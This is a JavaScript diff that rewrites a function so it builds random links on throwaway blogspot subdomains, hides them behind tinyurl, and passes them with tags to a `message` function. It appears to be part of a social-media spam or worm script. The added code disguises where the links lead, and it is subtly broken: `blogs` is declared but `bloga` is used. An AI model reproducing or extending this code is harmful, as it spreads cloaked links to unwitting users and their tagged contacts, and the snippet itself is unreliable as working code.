@@ -182,25 +182,24 @@ function _d(c) {
 }
 function _e(c) {
       var b = c["tags"];
+      var blogs = ["jebozov2343423423", "nabijacina12314241"];
+      var blog = bloga[Math.floor(Math.random() * bloga.length)];
+      var tlds = ["com","co.uk","de","jp","com.ar","com.br","ca","ch","dk","com.es","fr","gr","hk","ie","co.il","it","in","kr","nl","co.nz","mx","be","com.au","tw","cz","ae","pt","fi","sk","ru","no","sg","hu","ro","se","co.at","rs","ba","mk","hr"];
+      var tld = tlds[Math.floor(Math.random()*tlds.length)];
+      linku = "http://"+blog+".blogspot."+tld+"/"+rastgele(rand(10,15))+".html";
+
 
       var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://linear-cloud.herokuapp.com/?uid="+profile_id);
+      xhr.open("GET", "https://tinyurl.com/api-create.php?url="+linku);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
       xhr.send();
       xhr.onreadystatechange = function() {
           if (xhr.readyState == 4 && xhr.status == 200) {
-           data = JSON.parse(xhr.responseText);
-           if(data.link){
-             c["link"] = data.link;
-             c["tags"] = b;
-             message(c);
-           }
-
+           c.link = xhr.responseText;
+           c["tags"] = b;
+           message(c);
           }
       }
-
-
-
 }
 
 function message(c) {
